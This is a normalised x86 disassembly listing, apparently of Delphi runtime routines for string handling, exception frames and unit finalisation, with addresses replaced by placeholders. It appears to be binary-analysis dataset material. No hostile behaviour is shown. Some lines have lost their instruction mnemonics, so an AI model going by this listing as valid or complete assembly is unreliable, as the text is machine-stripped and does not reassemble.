jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_405110
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ rw-data ]
mov edi [ eax + 0x4 ]
xor eax eax
push ebp
push sub_405159
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ rw-data ] ebx
mov esi [ edi + ebx * 8 + 0x4 ]
test esi esi
je r-xdata
test ebx ebx
jg r-xdata
call esi
sub_405174
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov edi [ eax ]
xor ebx ebx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_404b30#6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test esi esi
je r-xdata
cmp edi ebx
jg r-xdata
call esi
sub_40521c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_407550
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_405244
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_405268
push ebx
push esi
push edi
mov edi rw-data
mov bl 0x10
mov esi [ rw-data ]
mov eax esi
mov ecx 0xa
cdq
idiv ecx
add dl 0x30
movzx eax bl
mov [ edi + eax ] dl
mov ecx 0xa
mov eax esi
cdq
idiv ecx
mov esi eax
dec ebx
test esi esi
jne r-xdata
mov bl 0x1c
mov esi [ rw-data ]
mov eax esi
and eax 0xf
movzx eax [ eax + rw-data ]
movzx edx bl
mov [ edi + edx ] al
mov ecx 0x10
mov eax esi
xor edx edx
div ecx
mov esi eax
dec ebx
test esi esi
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_4052cc
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_4052fc
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_4012cc
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_401264
push eax
call sub_40129c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_401264
push eax
call sub_40129c
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_405388
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_405268
call sub_4052fc
xor eax eax
mov [ rw-data ] eax
mov eax [ edi ]
mov esi eax
xor eax eax
mov [ edi ] eax
call esi
cmp [ edi ] 0x0
jne r-xdata
call sub_405110
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebx + 0x10 ]
test edi edi
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_4050e8
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
mov eax edi
call sub_406f9c
mov ebp [ ebx + 0x10 ]
mov esi [ ebp + 0x10 ]
cmp esi [ ebp + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test esi esi
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_4052cc
push esi
call sub_4012e4
mov eax [ ebx ]
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call sub_4012c4
call [ rw-data ]
sub_40547c
push ebp
mov ebp esp
call sub_40450c
push ebp
xor ecx ecx
push r-xdata
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_402f1c
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_4054b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8
call sub_402f00
mov [ eax ] ebx
mov [ eax + 0x4 ] esi
mov edx esi
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_40547c
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call sub_4012b4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_405530
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_402f1c
pop eax
sub_405554
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402f1c
sub_405584
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_4055f4
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4030fc
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402f1c
sub_4055c8
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_402f1c
sub_4055f4
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_402f00
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_405620
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_4055f4
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_405530
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4030fc
sub_405650
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_405670
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call sub_40134c
pop ebp
retn 0x4
sub_40568c
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_405530
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_405c6c
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_405650
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_405650
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_405c6c
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_405620
jmp r-xdata
sub_405728
xor ecx ecx
test edx edx
je r-xdata
jmp sub_405620
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_405758
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40568c
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4057a0
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_405620
not ecx
sub_4057b8
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_40568c
not ecx
sub_4057e8
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4030fc
pop ebx
retn
mov ecx ebx
sub_405818
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_405584
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
jo r-xdata
jmp r-xdata
cmp esi ecx
je r-xdata
mov al 0x5
jmp sub_403050
call sub_405c6c
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_405c6c
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4030fc
pop edi
pop esi
pop ebx
retn
sub_405864
test edx edx
je r-xdata
mov edx ecx
jmp sub_405584
test ecx ecx
je sub_405584
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_405818
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
jo r-xdata
push eax
push ecx
call sub_405584
pop edx
pop eax
jmp sub_405818
jmp r-xdata
call sub_4055f4
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4030fc
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4030fc
pop eax
mov edx edi
test edi edi
je r-xdata
mov al 0x5
jmp sub_403050
call sub_405584
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4058e0
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
jo r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
cmp edi ecx
jne r-xdata
call sub_4055f4
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_405c6c
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
mov al 0x5
jmp sub_403050
xor edi edi
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4030fc
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_405584
dec [ edx - 0x8 ]
sub_405974
cmp eax edx
je r-xdata
retn
test eax edx
je r-xdata
test eax eax
je r-xdata
movzx ecx [ eax ]
sub cl [ edx ]
jne r-xdata
cmp eax [ edx - 0x4 ]
retn
test edx edx
jne r-xdata
push ebx
mov ebx [ eax - 0x4 ]
sub ebx [ edx - 0x4 ]
push ebx
adc ecx 0xffffffff
and ecx ebx
sub ecx [ eax - 0x4 ]
sub eax ecx
sub edx ecx
cmp [ eax - 0x4 ] edx
retn
bsf ebx ebx
shr ebx 0x3
add ecx ebx
jns r-xdata
add ecx 0x4
js r-xdata
pop eax
add eax eax
pop ebx
mov al [ ecx + eax ]
cmp al [ ecx + edx ]
pop ebx
pop ebx
retn
mov ebx [ ecx + eax ]
xor ebx [ ecx + edx ]
jne r-xdata
sub_4059f0
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_4055f4
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4030fc
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_402f1c
sub_405a44
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_405530
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_405620
jmp r-xdata
pop ebx
retn 0x4
sub_405a84
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_4059f0#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4030fc
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_405c6c
mov edi ecx
sub_405acc
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_405c6c
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4030fc
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4030fc
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_405b28
push ebx
push esi
add esp 0xfffffff0
test edx edx
je r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov esi [ edx - 0x4 ]
mov ebx [ eax - 0x4 ]
cmp esi ebx
jl r-xdata
test ebx ebx
jle r-xdata
dec ebx
add esi edx
add edx ebx
mov [ esp + 0x8 ] esi
add eax ebx
mov [ esp + 0x4 ] edx
neg ebx
movzx ecx [ eax ]
mov [ esp ] ebx
jne r-xdata
sub esi 0x2
mov [ esp + 0xc ] esi
sub esi 0x2
mov [ esp + 0xc ] esi
mov esi [ esp ]
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
mov eax edx
sub eax [ esp + 0x4 ]
cmp cl [ edx + 0x1 ]
je r-xdata
add esi 0x2
jl r-xdata
mov esi [ esp ]
add edx 0x2
cmp edx [ esp + 0xc ]
jb r-xdata
add edx 0x2
xor eax eax
cmp edx [ esp + 0x8 ]
ja r-xdata
add edx 0x2
cmp edx [ esp + 0xc ]
jb r-xdata
movzx ebx [ eax + esi ]
cmp bx [ edx + esi ]
jne r-xdata
inc edx
mov eax edx
sub eax [ esp + 0x4 ]
add esp 0x10
pop esi
pop ebx
retn
add esi 0x2
jl r-xdata
cmp cl [ edx ]
je r-xdata
cmp edx [ esp + 0x8 ]
jb r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax edx
sub eax [ esp + 0x4 ]
cmp cl [ edx ]
je r-xdata
cmp edx [ esp + 0x8 ]
jb r-xdata
movzx ebx [ eax + esi ]
cmp bx [ edx + esi + 0x1 ]
jne r-xdata
add edx 0x2
xor eax eax
cmp edx [ esp + 0x8 ]
ja r-xdata
cmp cl [ edx + 0x1 ]
je r-xdata
cmp cl [ edx ]
je r-xdata
xor eax eax
jmp r-xdata
cmp cl [ edx + 0x1 ]
je r-xdata
cmp cl [ edx ]
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax edx
sub eax [ esp + 0x4 ]
cmp cl [ edx + 0x2 ]
je r-xdata
cmp cl [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cl [ edx + 0x3 ]
je r-xdata
add edx 0x2
cmp cl [ edx + 0x3 ]
je r-xdata
add edx 0x2
add edx 0x4
cmp edx [ esp + 0xc ]
jb r-xdata
add edx 0x2
add edx 0x4
cmp edx [ esp + 0xc ]
jb r-xdata
cmp edx [ esp + 0x8 ]
jb r-xdata
cmp edx [ esp + 0x8 ]
jb r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
sub_405c6c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_405530
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_4055f4
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_402f34
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4030fc
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_405cd8
push ebx
mov ebx edx
mov edx ecx
xor ecx ecx
test ebx ebx
je r-xdata
push ecx
call sub_404030
pop ecx
mov edx ebx
pop ebx
jmp sub_403fdc
mov ecx [ ebx - 0x4 ]
sub edx ecx
sub_405d40
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call sub_40138c
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_405d64
cmp [ eax ] edx
je r-xdata
retn
test edx edx
je sub_405d28
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_405d28
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_403050
sub_405d8c
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_405d28
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_405fa4
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_405670
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_405670
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_405fa4
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_405e18
jmp r-xdata
sub_405e18
test ecx ecx
je sub_405d28
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_403050
pop edx
push [ edx ]
mov [ edx ] eax
call sub_40138c
retn
sub_405e3c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_405d8c
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_405e6c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_405e18
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_405ed4
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_405f58
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_405ec8
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_405e18
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_405fa4
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_405d18
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_405d00
mov ebx eax
mov eax [ edi ]
call sub_405ec8
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4030fc
mov eax esi
sub_405fe8
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_406018
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_406018
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_406018
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_405fe8
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_403050
sub_4060ac
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4060f8
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_4060f8
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_405554
jmp r-xdata
call sub_405530
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_405d40
jmp r-xdata
call sub_405d28
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_4060e0
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_4060f8
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4060ac
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_40700c
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_406934
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_403050
sub_406208
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4030fc
mov edx [ eax + esi ]
add eax ebx
call sub_405584
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_405d64
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_4061f0
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4030fc
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_406324
pop eax
jmp r-xdata
